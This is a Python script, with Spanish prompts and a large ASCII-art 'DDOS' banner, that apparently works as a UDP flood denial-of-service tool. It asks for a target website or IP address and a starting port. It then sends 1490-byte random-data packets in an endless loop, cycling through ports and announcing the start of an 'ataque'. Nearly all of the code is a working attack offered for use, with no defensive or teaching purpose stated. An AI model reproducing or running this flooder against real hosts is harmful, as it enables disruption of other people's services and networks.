from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)
import colorama
from colorama import Fore,Back
from tqdm.auto import tqdm
de_version="1.1"
colorama.init()
################################################################################
banner=Fore.RED+'''

██████╗░██╗██╗░░░██╗██╗██╗░░░██╗██╗
██╔══██╗██║╚██╗░██╔╝██║██║░░░██║██║
██████╦╝██║░╚████╔╝░██║╚██╗░██╔╝██║
██╔══██╗██║░░╚██╔╝░░██║░╚████╔╝░██║
██████╦╝██║░░░██║░░░██║░░╚██╔╝░░██║
╚═════╝░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝
_________________¶¶111111¶11111111111111¶¶111¶____
_________________¶¶11111¶111111111111111¶¶111¶____
________________¶¶111111¶11111111¶¶11¶¶¶¶1111¶____
_______________¶¶1111111111111111¶¶¶¶¶¶¶11111¶____
_____________1¶¶11111111111111111¶¶___¶¶11111¶____
___________¶¶¶¶11111¶1111111¶¶1111¶¶¶11¶11111¶____
_________¶¶¶111111111111111111111111¶¶¶¶11111¶____
_______1¶¶11111111111111111111111111111¶¶¶111¶____
______¶¶111111111111111111111111111111111¶¶¶1¶____
_____¶¶1111111111111111¶11¶¶111111111111111¶¶¶____
____¶¶11111111111111111¶¶¶¶11111111111111111¶¶____
___¶¶1111111111111111111¶¶1111111111111111111¶¶___
__¶¶11111111111111111111¶¶11111111111111111111¶¶__
__¶111111111111111111111¶1111111111111111111111¶__
_¶¶11111111111111111111¶¶1111111111111111111111¶¶_
_¶111111111111111111111¶¶1111111111111111111111¶¶_
_¶111111111111111111111¶¶1111111111111111111111¶¶_
1¶111111111111111111111¶¶1111111111111111111111¶¶_
1¶111111111111111111111¶¶1111111111111111111111¶¶_
1¶111111111111111111111¶¶1111111111111111111111¶1_
_¶1111111111111111111111¶¶11111111111111111111¶¶__
_¶1111111111111111111111¶¶11111111111111111111¶1__
_¶111111111111111111111¶¶¶¶111111111111111111¶¶___
_¶¶1111111111111111111¶¶1¶¶¶¶111111111111111¶¶____
_1¶1111111111111111¶¶¶¶¶¶¶¶¶¶¶¶111111111111¶¶1____
__¶11111111111¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶11111¶¶¶1____
__¶¶1111111111¶¶¶¶11111¶¶_¶¶1111¶¶¶¶1111¶¶¶1¶¶____
__1¶¶¶11111111111111111¶¶_¶1¶1111111111¶¶¶11¶¶____
___¶¶¶¶¶1111111111111111¶¶¶¶1111111111¶¶_¶_1¶¶____
___1¶111¶¶¶11111111111111¶¶¶¶111111¶1¶¶_1¶_11¶____
____¶¶1111¶¶¶111111111111¶¶¶1111111¶¶¶_¶¶1111¶____
____1¶111111¶¶¶1111111111¶1¶¶1111111¶¶¶11¶11¶¶____
_____¶¶1111111¶¶¶¶1111111¶¶¶¶111111111¶1¶¶_1¶¶____
_____1¶1111111111¶¶¶¶1111¶¶1¶¶11111111¶¶¶¶_1¶1____
______¶¶11111111111¶¶¶¶111¶1¶¶111111111¶¶¶__¶1____
______1¶11111111111111¶¶¶¶¶_1¶1111111111¶¶111¶____
_______¶¶111111111111111¶¶¶1¶¶1111111111¶¶¶¶¶¶1___
________¶111111111111111¶¶__1¶¶¶11111111¶¶¶1¶¶¶___
________¶¶111111111111111¶1__1¶1¶¶¶¶¶1111¶¶¶¶¶¶1__
_________¶111111111111111¶¶___¶111¶¶¶¶¶¶¶¶¶¶_1¶___
_________¶¶11111111111111¶¶___¶¶1111111¶¶¶____¶___
__________¶1111111111111¶¶_____¶111111111¶________
__________¶¶111111111111¶¶_____¶¶1111111¶¶________
___________¶111111111111¶1______¶1111111¶¶________
___________¶¶11111111111¶_______¶¶111111¶¶________
____________¶1111111111¶¶________¶111111¶¶________
____________¶¶111111111¶¶________¶¶11111¶¶________
____________1¶111111111¶¶_________¶11111¶¶________
_____________¶¶11111111¶1_________¶¶1111¶¶________
_____________¶¶111¶1111¶__________1¶1111¶¶________
______________¶111¶¶111¶¶__________¶¶1111¶________
______________¶111¶¶111¶¶__________¶¶1111¶________
______________¶11111111¶1__________1¶1¶¶1¶¶_______
_____________¶¶11111111¶____________¶1¶¶11¶_______
____________1¶111111111¶____________¶11__1¶_______
____________¶¶11111111¶¶____________¶¶¶¶¶¶¶_______
____________¶111111111¶¶____________¶¶¶¶¶¶¶_______
____________¶1111111111¶____________¶¶¶¶¶¶¶¶______
___________1¶1111111111¶____________¶¶¶¶¶¶¶¶______
___________1¶1111111111¶1___________¶¶¶¶¶¶¶¶1_____
____________¶1111111111¶¶___________1¶¶¶¶¶¶¶______
____________¶1111111111¶¶____________¶¶¶¶¶¶¶______
____________¶¶111111111¶¶____________¶¶¶¶¶¶¶¶_____
____________1¶1111111111¶_____________¶¶¶¶¶¶¶_____
_____________¶1111111111¶_____________¶¶¶¶¶¶¶¶____
_____________¶¶111111111¶_____________1¶¶¶¶¶¶¶¶___
______________¶111111111¶1____________¶¶¶¶¶¶¶¶¶¶__
______________¶¶11111111¶1____________¶¶¶¶¶¶¶¶¶¶__
_______________¶11111111¶¶___________¶¶¶¶¶¶¶¶¶¶1__
_______________¶¶1111111¶¶___________¶¶¶¶¶¶¶¶¶¶___
________________¶¶111111¶¶____________¶¶¶¶¶¶¶¶____
_________________¶111111¶¶_____________¶¶¶¶¶¶_____


─────────────────────────────────────────────────────────────
─████████████───████████████───██████████████─██████████████─
─██░░░░░░░░████─██░░░░░░░░████─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██░░████░░░░██─██░░████░░░░██─██░░██████░░██─██░░██████████─
─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─██░░██─────────
─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─██░░██████████─
─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─██░░░░░░░░░░██─
─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─██████████░░██─
─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─────────██░░██─
─██░░████░░░░██─██░░████░░░░██─██░░██████░░██─██████████░░██─
─██░░░░░░░░████─██░░░░░░░░████─██░░░░░░░░░░██─██░░░░░░░░░░██─
─████████████───████████████───██████████████─██████████████─
─────────────────────────────────────────────────────────────                                   
'''+Fore.RESET
credit=(Fore.CYAN+
'''                                                                                                                             
'''+Fore.RESET)

uname=system()
if uname=="Windows":
	cmd='cls'
else :
	cmd='clear'
os.system(cmd)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def chech_con():
	try:
		request.urlopen('https://www.google.co.in/',timeout=3)
	except KeyboardInterrupt:
		print(Fore.RED + "Detenido por el usuario" + Fore.RESET)
		exit()
	except:
		print(Fore.RED+'Por favor revisa tu conexion  a internet'+Fore.RESET)
		exit()
def update():
	import urllib.request as urequest
	from bs4 import BeautifulSoup as soup
	page=urequest.urlopen('https://pastebin.com/G7gFkwfb').read()
	soup=soup(page,'html.parser')
	version=soup.find('div',class_='de1').text
	if version>de_version:
		import webbrowser
		print(Fore.CYAN + "Version " + Fore.MAGENTA + version + Fore.CYAN + " is Avaiable")
		print(Fore.RED + "Por favor actualiza el programa")
		print("Redirecting...." + Fore.RESET)
		time.sleep(3)
		webbrowser.open('https://github.com/BOT-CODER/SniperMan/')
		exit()
	else:
		pass
try:
	print(Fore.CYAN+" Comprobando Internet "+Fore.RESET)
	time.sleep(2)
	chech_con()
	update()
	os.system(cmd)
except KeyboardInterrupt:
	print(Fore.RED + "Detenido por el usuario" + Fore.RESET)
	exit()
try:
	while True:
		print(banner)
		print(credit)
		print(Fore.RED+"1. Dominio del sitio web\n2. Dirección IP\n3. Salir"+Fore.RESET)
		opt=str(input(Fore.GREEN+"\nIngresa una opcion: "+Fore.RESET))
		if opt=='1':
			domain=str(input(Fore.CYAN+"Ingrese el sitio web(ej:google.com):"+Fore.RESET))
			ip=socket.gethostbyname(domain)
			break
		elif opt=='2':
			ip = input(Fore.CYAN+"Direccion IP  : "+Fore.RESET)
			break
		elif opt=='3':
			time.sleep(1)
			print(Fore.RED+"Nos vemos pronto :D"+Fore.RESET)
			exit()
		else:
			print(Fore.RED+'Opcion invalida!'+Fore.RESET)
			time.sleep(2)
			os.system(cmd)
	port =int(input(Fore.CYAN+"Numero del puerto  : "+Fore.RESET))
	os.system(cmd)
	print(Fore.CYAN+"Iniciando....")
	for i in tqdm(range(10000)):
		print(end='\r')
	time.sleep(4)
	print('Comenzando ataque :D ...')
	time.sleep(4)
	sent = 0
except Exception as e:
	print(Fore.RED+"¡Algo salió mal!")
	print("Razon:",e,Fore.RESET)
	exit()
try:
	while True:
		sock.sendto(bytes, (ip,port))
		sent=sent+1
		port=port+1
		print(Fore.CYAN+ "Paquete %s enviado %s a través del puerto:%s" % (sent, ip, port))
		if port==65534:
			port=1
		elif port==1900:
			port=1901
except Exception as e:
	print(Fore.RED+"Terminado\nRazon: ",e,Fore.RESET)
except KeyboardInterrupt:
	print(Fore.RED+"\nDetenido por el usuario"+Fore.RESET)